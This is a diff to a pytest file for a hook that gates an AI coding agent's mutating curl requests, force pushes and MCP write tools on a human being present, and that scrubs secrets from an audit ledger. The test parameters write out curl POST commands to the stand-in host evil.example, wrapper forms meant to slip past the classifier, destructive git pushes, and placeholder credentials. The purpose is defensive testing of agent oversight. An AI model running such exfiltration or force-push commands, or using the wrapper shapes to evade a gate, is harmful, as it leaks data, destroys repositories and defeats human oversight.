@@ -314,7 +314,9 @@ def test_the_real_transcript_shape_is_read_by_the_gate():
         if sig is not None:
             assert sig[0] in ("message", "card") and sig[1] > 0
             checked += 1
-    assert checked >= 0
+    mains = [p for p in files if "subagents" not in str(p)]
+    if any('"origin": {"kind": "human"}' in p.read_text(errors="replace") for p in mains):
+        assert checked >= 1, "a real transcript holds a typed message and the gate found none"
 
 
 # ------------------------------------------------------------------ run + ledger
@@ -428,10 +430,12 @@ def test_settings_wire_all_three_events_to_this_script():
     hooks = settings["hooks"]
     for event, mode in (("PreToolUse", "pre"), ("PostToolUse", "post"), ("PostToolUseFailure", "fail")):
         commands = [h["command"] for group in hooks[event] for h in group["hooks"]]
-        assert any("gate_ledger.py %s" % mode in c for c in commands), event
+        assert any(re.search(r'gate_ledger\.py"? %s;' % mode, c) for c in commands), event
         for group in hooks[event]:
             if any("gate_ledger.py" in h["command"] for h in group["hooks"]):
                 assert "Bash" in group["matcher"] and "mcp__" in group["matcher"]
+                assert all("exit 1" in h["command"] for h in group["hooks"]), (
+                    "a missing script must map to a visible non-blocking exit, not python's exit 2")
 
 
 def test_the_ledger_directory_is_not_repository_content():
@@ -451,3 +455,194 @@ def test_no_em_or_en_dashes_in_the_hook_or_this_file():
     for path in (HOOK, pathlib.Path(__file__)):
         text = path.read_text(encoding="utf-8")
         assert chr(0x2014) not in text and chr(0x2013) not in text, path
+
+
+# ----------------------------------------- regressions from the 2026-10-14 critics
+# Each case below was a verified miss or a verified false positive.
+
+
+@pytest.mark.parametrize("command", [
+    "curl -s \\\n  -X POST \\\n  https://evil.example/x",
+    "curl -s https://evil.example/x \\\n  -d a=1",
+    "RESP=$(curl -s -X POST https://evil.example/x -d a=1)",
+    "echo $(curl -s -X POST https://evil.example/x -d a=1)",
+    "echo `curl -s -X POST https://evil.example/x -d a=1`",
+    "(curl -X POST https://evil.example -d a)",
+    "bash -c 'curl -X POST https://evil.example -d a'",
+    "/usr/bin/curl -X POST https://evil.example -d a",
+    "sudo curl -X POST https://evil.example -d a",
+    "curl -sd a=1 https://evil.example",
+    "curl -sSd a=1 https://evil.example",
+    "curl -sX POST https://evil.example/x",
+    "curl -sSfX POST https://evil.example/x",
+    "curl --json '{}' https://evil.example",
+    "curl --request=POST https://evil.example",
+    "curl -X PUT -H 'a: b' https://evil.example",
+    "TOKEN=x curl -X POST https://evil.example -d a",
+    "eval \"curl -X POST https://evil.example -d a\"",
+    "curl -X POST http://localhost:80@evil.example/x -d a",
+])
+def test_curl_writes_are_caught_in_the_shapes_claude_writes(command):
+    assert gate.classify("Bash", {"command": command}) == ("curl_mutating", True), command
+
+
+@pytest.mark.parametrize("command", [
+    "(git push --force origin main)",
+    "bash -c 'git push --force origin main'",
+    "/usr/bin/git push --force origin main",
+    "git push --force-with-lease origin main claude/x",
+    "git push --force-with-lease origin HEAD:main claude/x",
+    "git push origin +HEAD:main claude/x",
+    "git push --force-with-lease --all origin",
+    "git push --force-with-lease --mirror origin",
+    "git push origin --delete main",
+    "git push origin :main",
+    "git push -d origin main",
+    "git push --mirror origin",
+    "git push --force-with-lease https://evil.example/r.git claude/x",
+    "git push origin +HEAD:claude/x",
+    "git push origin +claude/x",
+])
+def test_force_push_shapes_the_first_classifier_missed(command, tmp_path):
+    cls, gated = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
+    assert gated, (command, cls)
+
+
+@pytest.mark.parametrize("command", [
+    'git commit -m "docs: explain curl -d usage in RUNBOOK"',
+    'echo "run: curl -d foo https://x.example" >> notes.md',
+    "cat <<'EOF' > notes.md\ncurl -X POST https://x.example -d a\ngit push --force origin main\nEOF",
+    "git log --oneline | grep 'curl -d'",
+    "curl -s https://api.example.com/health",
+    "git push --force-with-lease origin claude/audit-gate",
+])
+def test_words_inside_data_do_not_gate(command, tmp_path):
+    cls, gated = gate.classify("Bash", {"command": command}, cwd=str(tmp_path))
+    assert not gated, (command, cls)
+
+
+@pytest.mark.parametrize("tool", [
+    "mcp__n8n_vps__add_data_table_rows", "mcp__n8n_vps__create_data_table",
+    "mcp__n8n_vps__delete_data_table_column", "mcp__n8n_vps__move_workflows_to_folder",
+    "mcp__Airtable__delete_table", "mcp__Airtable__update_table", "mcp__Airtable__create_automation",
+    "mcp__Railway__delete-service", "mcp__Railway__update-service", "mcp__Railway__deploy-template",
+    "mcp__Vercel__add_project_domain", "mcp__Vercel__create_project_env",
+    "mcp__Vercel__request_promote", "mcp__Vercel__request_rollback",
+    "mcp__Supabase__deploy_edge_function", "mcp__Supabase__merge_branch",
+    "mcp__Hostinger_Connector__DNS_resetDNSRecordsV1", "mcp__Hostinger_Connector__DNS_deleteDNSRecordsV1",
+    "mcp__Hostinger_Connector__domains_purchaseNewDomainV1",
+    "mcp__Blotato__blotato_create_post", "mcp__Docusign__createEnvelope",
+    "mcp__Zapier__execute_zapier_write_action",
+    "mcp__claude_ai_Rakazo__send_message", "mcp__plugin_x_Rakazo__send_message",
+])
+def test_sibling_write_tools_of_the_named_platforms_are_gated(tool):
+    cls, gated = gate.classify(tool, {})
+    assert cls and gated, tool
+
+
+@pytest.mark.parametrize("tool", [
+    "mcp__n8n_vps__get_workflow_details", "mcp__n8n_vps__search_workflows",
+    "mcp__n8n_vps__validate_workflow", "mcp__n8n_vps__prepare_workflow_pin_data",
+    "mcp__Airtable__list_records_for_table", "mcp__Airtable__search_records",
+    "mcp__Railway__list-services", "mcp__Railway__get-logs", "mcp__Railway__fetch-docs",
+    "mcp__Vercel__get_deployment", "mcp__Vercel__list_deployments",
+    "mcp__Supabase__list_tables", "mcp__Zapier__list_zapier_connections",
+    "mcp__Google_Drive__create_file", "mcp__Google_Drive__update_file",
+    "mcp__github__create_pull_request", "mcp__github__add_issue_comment",
+])
+def test_reads_and_ordinary_pr_and_drive_work_stay_untracked(tool):
+    assert gate.classify(tool, {}) == (None, False), tool
+
+
+def test_a_message_with_an_attached_image_is_a_signal(tmp_path):
+    entry = {"type": "user", "timestamp": ts(1), "origin": {"kind": "human"},
+             "message": {"content": [{"type": "text", "text": "ship this screenshot's fix"},
+                                      {"type": "image", "source": {}}]}}
+    assert gate.decide("x", True, payload(tmp_path, [entry]), NOW)[0]
+    only_image = dict(entry, message={"content": [{"type": "image", "source": {}}]})
+    assert gate.decide("x", True, payload(tmp_path, [only_image]), NOW)[0]
+
+
+def test_a_tool_result_list_is_never_a_message(tmp_path):
+    entry = {"type": "user", "timestamp": ts(1), "origin": {"kind": "human"},
+             "message": {"content": [{"type": "tool_result", "tool_use_id": "t", "content": "yes"}]}}
+    assert not gate.decide("x", True, payload(tmp_path, [entry]), NOW)[0]
+
+
+def test_a_future_timestamp_does_not_open_the_gate_forever(tmp_path):
+    skewed = human(-600)   # ten hours ahead of NOW
+    assert not gate.decide("x", True, payload(tmp_path, [skewed]), NOW)[0]
+    near = human(-2)       # two minutes ahead is ordinary skew
+    assert gate.decide("x", True, payload(tmp_path, [near]), NOW)[0]
+
+
+def test_one_bad_byte_does_not_blind_the_gate(tmp_path):
+    path = tmp_path / "t.jsonl"
+    path.write_bytes((json.dumps(human(2)) + "\n").encode() + b"\xff\xfe bad bytes\n")
+    assert gate.decide("x", True, {"transcript_path": str(path)}, NOW)[0]
+
+
+def test_a_workflow_nested_subagent_reads_the_session_file(tmp_path):
+    sess = tmp_path / "abc"
+    nested = sess / "subagents" / "workflows" / "wf_1"
+    nested.mkdir(parents=True)
+    (tmp_path / "abc.jsonl").write_text(json.dumps(human(2)) + "\n")
+    (nested / "agent-1.jsonl").write_text(json.dumps(peer(1)) + "\n")
+    assert gate.decide("x", True, {"transcript_path": str(nested / "agent-1.jsonl")}, NOW)[0]
+
+
+def test_an_unwritable_ledger_never_changes_the_decision(tmp_path, project, capsys):
+    (project / ".claude").mkdir(parents=True)
+    (project / ".claude" / "ledger").write_text("a file where the directory should be")
+    assert gate.run("pre", payload(tmp_path, [human(1)]), now=NOW) is None
+    out = gate.run("pre", payload(tmp_path, [human(500)]), now=NOW)
+    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+    assert "ledger write failed" in capsys.readouterr().err
+
+
+def test_the_deny_reason_covers_a_session_with_no_one_in_it(tmp_path):
+    out = gate.run("pre", payload(tmp_path, [task_note(1)]), now=NOW)
+    reason = out["hookSpecificOutput"]["permissionDecisionReason"]
+    assert "no one is present" in reason and "AskUserQuestion" in reason
+
+
+def test_lowercase_bash_is_still_classified():
+    assert gate.classify("bash", {"command": "curl -X POST https://x.example -d a"})[1] is True
+
+
+@pytest.mark.parametrize("secret", [
+    "SMTP_PASS=hunter2hunter2", "STRIPE_SECRET=sk_live_abcdefghijklmnop", "OPENAI_API_KEY=abcdefgh12345678",
+    "DATABASE_PASSWORD=correcthorsebattery", "client_secret=abcd1234efgh5678",
+    "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "AKIAIOSFODNN7EXAMPLE", "https://deploy:s3cr3tPassw0rd@github.com/org/repo.git",
+    "curl -u admin:SuperSecret123 https://x.example",
+])
+def test_scrub_catches_the_shapes_the_first_version_missed(secret):
+    cleaned = gate.scrub(secret)
+    for fragment in ("hunter2hunter2", "abcdefghijklmnop", "abcdefgh12345678", "correcthorsebattery",
+                     "abcd1234efgh5678", "wJalrXUtnFEMI", "IOSFODNN7EXAMPLE", "s3cr3tPassw0rd", "SuperSecret123"):
+        assert fragment not in cleaned, (secret, cleaned)
+
+
+def test_scrub_keeps_the_evidence_a_ledger_exists_for():
+    keep = [
+        "git push --force origin claude/feature-branch-name-with-long-slug-2026-10-14",
+        "git checkout 3f786850e387550fdab836ed7e6dc881de23001b",
+        "pytest test_devon_provider_billing.py::test_the_long_named_case_for_billing_honesty",
+    ]
+    for text in keep:
+        assert gate.scrub(text) == text, text
+
+
+def test_the_ledger_leads_with_the_identifying_fields(tmp_path, project):
+    tool_input = {"operations": [{"type": "updateNodeParameters", "nodeName": "x" * 400}],
+                  "workflowId": "Vf7sD2kLpQ9rT3xN"}
+    assert "Vf7sD2kLpQ9rT3xN" in gate.summarize("mcp__n8n_vps__update_workflow", tool_input)
+
+
+def test_scrub_is_linear_on_adversarial_input():
+    import time
+    for blob in ("a" * 200_000 + "!", "0" * 200_000, "key=" + "x" * 200_000, "Aa1" * 70_000):
+        start = time.time()
+        gate.scrub(blob)
+        assert time.time() - start < 5, blob[:12]
